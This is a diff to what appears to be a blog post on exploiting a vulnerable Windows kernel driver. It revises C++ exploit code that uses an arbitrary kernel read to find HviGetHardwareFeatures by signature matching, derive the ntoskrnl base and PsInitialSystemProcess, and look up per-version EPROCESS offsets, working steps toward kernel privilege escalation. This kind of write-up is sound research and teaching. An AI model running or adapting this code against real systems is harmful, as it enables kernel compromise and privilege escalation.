@@ -313,7 +313,7 @@ Sadly this structure was not exported by ntoskrnl which meant that using it for 
 
 I opened `ntoskrnl` in IDA and began walking down the exported symbols list to look for a usable function with a signature that, most importantly, didn't change across windows versions. After some looking, I found one I was happy with, `HviGetHardwareFeatures`.
 
-Based on some checks across multiple Windows 10 versions and an up-to-date Windows 11 version - the export wasn't missing and had a repeatable and predictable signature. On Windows 11 part of it it was shifted up `0x10` bytes which I can easily address with some if statement nonsense.
+Based on some checks across multiple Windows 10 versions and an up-to-date Windows 11 version - the export wasn't missing and had a repeatable and predictable signature. However dynamically resolving and checking the QWORDS proceeding the function start address against a local copy would still be ideal.
 
 ![Oops...](../assets/img/gethwfeature-signature.png)
 
@@ -348,11 +348,6 @@ DWORD GetOffset(LPSTR method) {
 int main() {
     ...
     printf_s("\t[++] Driver Handle: 0x%x\n", DriverHandle);
-    DWORD PSISP_offset = GetOffset((LPSTR)"PsInitialSystemProcess");
-    printf_s("\t[++] PsInitialSystemProcess Offset: %llx\n", PSISP_offset);
-
-    DWORD hvigethwf_offset = GetOffset((LPSTR)"HviGetHardwareFeatures");
-    printf_s("\t[++] HviGetHardwareFeatures Offset: %llx\n", hvigethwf_offset);
 ```
 
 Now, to move onto the code to parse out the `PspSystemQuotaBlock`. Rechecking the allocation and adding a print out for the offsets, I noticed it is 'almost' always located at offsets `0x20` and `0x50`.
@@ -377,18 +372,15 @@ int main() {
     ULONGLONG psystemquotablock_two;
 
     for (int i = 0; i < 3; i++) {
-        // Read value from both offsets, only proceed if they match
         psystemquotablock_one = leak(DriverHandle, 0x20);
         psystemquotablock_two = leak(DriverHandle, 0x50);
         if (psystemquotablock_one == psystemquotablock_two) {
-            //Print the value, so you can wave at the wrong address just before the BSOD
             printf_s("\t[++] PspSystemQuotaBlock: %llx\n", psystemquotablock_one);
 
             ULONGLONG hvigethwf = walk_nt(DriverHandle, psystemquotablock_one);
             printf_s("\t[++] HviGetHardwareFeatures: %llx\n", hvigethwf);
 
-            // Calculate nt base addr using offset and address found
-            ULONGLONG nt_base = hvigethwf - hvigethwf_offset;
+            ULONGLONG nt_base = hvigethwf - HIGHWF_offset;
             printf_s("\t[++] ntoskrnl Base Addr: % llx\n", nt_base);
             printf_s("\t[++] PsInitialSystemProcess: %llx\n", nt_base + PSISP_offset);
 
@@ -398,35 +390,60 @@ int main() {
 
 Much of the above code assumes that the `walk_nt` function can resolve for the `HviGetHardwareFeatures` method. This is then used with the loaded offset to get the `ntoskrnl base address` Lets discuss how that works to find the correct function signature. I apologize in advance for the below - but I can't argue with results.
 
-The function starts with the `PsSystemQuotaBlock` address and in a loop reads at an offset of `-0x10` to try and find the header for the function signature. If not, it will then increment the offset decrement by `0x10`. Both signature block cases are checked for when a matching QWORD header is found.
+The function starts with the `PsSystemQuotaBlock` address and in a loop reads at an offset of `-0x10`. The value here is compared to a manually loaded local copy of `ntoskrnl`'s `HviGetHardwareFeatures` first QWORD. If it matches the rest of the proceeding values are looped and checked. If all the values appear to match - the function is assumed to be found. If no/insufficient matches are found, it will then increment the offset decrement by `0x10` and try again.
 
 ```c++
 ULONGLONG walk_nt(HANDLE device_handle, ULONGLONG psysquota)
 {
+    ULONG_PTR PSISP_methodAddr;
+    ULONG_PTR HIGHWF_methodAddr;
+    // Load ntoskrnl for offset and function sig locating
+    HMODULE ntoskrnl = LoadLibraryA("ntoskrnl.exe");
+    if (ntoskrnl == NULL) {
+        printf_s("\t[--] Couldn't load ntoskrnl.exe\n");
+        return 0;
+    }
+
+    // Get and assign public offsets
+    PSISP_methodAddr = (ULONG_PTR)GetProcAddress(ntoskrnl, "PsInitialSystemProcess");
+    if (PSISP_methodAddr) {
+        PSISP_offset = (DWORD)(PSISP_methodAddr - (ULONG_PTR)(ntoskrnl));
+    }
+    else {
+        printf_s("\t[--] Couldn't Get Offset of PsInitialSystemProcess\n");
+        return 0;
+    }
+    HIGHWF_methodAddr = (ULONG_PTR)GetProcAddress(ntoskrnl, "HviGetHardwareFeatures");
+    if (HIGHWF_methodAddr) {
+        HIGHWF_offset = (DWORD)(HIGHWF_methodAddr - (ULONG_PTR)(ntoskrnl));
+    }
+    else {
+        printf_s("\t[--] Couldn't Get Offset of HviGetHardwareFeatures\n");
+        return 0;
+    }
+    // Print offsets
+    printf_s("\t[++] PsInitialSystemProcess Offset: %llx\n", PSISP_offset);
+    printf_s("\t[++] HviGetHardwareFeatures Offset: %llx\n", HIGHWF_offset);
+
+    ULONGLONG* hvi_sig = (ULONGLONG*)((ULONGLONG)HIGHWF_methodAddr);
+    ULONGLONG initial = *(hvi_sig + 0);
+
     // To Find nt!HviGetHardwareFeatures
     DWORD one = 0x10;
     while (true) {
+        int counter = 0;
         ULONGLONG first = arbitrary_read(device_handle, psysquota - one);
-        // Function header QWORD
-        if (first == (ULONGLONG)0x83485710245C8948) {
-            ULONGLONG offset1 = arbitrary_read(device_handle, (psysquota - (one-0x28)));
-            ULONGLONG offset2 = arbitrary_read(device_handle, (psysquota - (one-0x30)));
-            ULONGLONG offset3 = arbitrary_read(device_handle, (psysquota - (one-0x38)));
-            ULONGLONG offset4 = arbitrary_read(device_handle, (psysquota - (one-0x40)));
-            ULONGLONG offset5 = arbitrary_read(device_handle, (psysquota - (one-0x48)));
-            ULONGLONG offset6 = arbitrary_read(device_handle, (psysquota - (one-0x50)));
-            // The most shameful block of nested if statements I've produced to date
-            if ((offset1 == (ULONGLONG)0x7220244439400000 && offset2 == (ULONGLONG)0x890789A20FC93311) || 
-                    (offset2 == (ULONGLONG)0x7220244439400000 && offset3 == (ULONGLONG)0x890789A20FC93311)) {
-                if ((offset2 == (ULONGLONG)0x890789A20FC93311 && offset3 == (ULONGLONG)0x0C5789084F89045F) || 
-                        (offset3 == (ULONGLONG)0x890789A20FC93311 && offset4 == (ULONGLONG)0x0C5789084F89045F)) {
-                    if ((offset3 == (ULONGLONG)0x0C5789084F89045F && offset4 == (ULONGLONG)0x48078948C03309EB) || 
-                            (offset4 == (ULONGLONG)0x0C5789084F89045F && offset5 == (ULONGLONG)0x48078948C03309EB)) {
-                        if ((offset4 == (ULONGLONG)0x48078948C03309EB && offset5 == (ULONGLONG)0x30244C8B48084789) || 
-                            ((offset5 == (ULONGLONG)0x48078948C03309EB && offset6 == (ULONGLONG)0x30244C8B48084789)))
-                        return (psysquota - one);
-                    }
+        if (first == initial) {
+            counter++;
+            for (int i = 1; i < 11; i++) {
+                ULONGLONG read_check = arbitrary_read(device_handle, psysquota - (one - (8*i)));
+                ULONGLONG load_check = *(hvi_sig + i);
+                if (read_check == load_check) {
+                    counter++;
                 }
+            }
+            if (counter >= 11) {
+                return (psysquota - one);
             }
         }
         one += 0x10;
@@ -522,14 +539,14 @@ int GetUniqueProcessIdOffset(const std::string& version) {
         {"Windows 7", 0x180},
         {"Windows 8", 0x2E0},
         {"Windows 8.1", 0x2E0},
-        {"Windows 10 (1507)", 0x2E8},
-        {"Windows 10 (1511)", 0x2E8},
-        {"Windows 10 (1607)", 0x2E8},
-        {"Windows 10 (1703)", 0x2E8},
-        {"Windows 10 (1709)", 0x2E8},
-        {"Windows 10 (1803)", 0x2E8},
-        {"Windows 10 (1809)", 0x2E0},
-        {"Windows 10 (1903/1909)", 0x2E0},
+        {"Windows 10 (1507)", 0x2e8},
+        {"Windows 10 (1511)", 0x2e8},
+        {"Windows 10 (1607)", 0x2e8},
+        {"Windows 10 (1703)", 0x2e0},
+        {"Windows 10 (1709)", 0x2e0},
+        {"Windows 10 (1803)", 0x2e0},
+        {"Windows 10 (1809)", 0x2e0},
+        {"Windows 10 (1903/1909)", 0x2e8},
         {"Windows 10 (2004+)", 0x440},
         {"Windows 11", 0x440},
     };
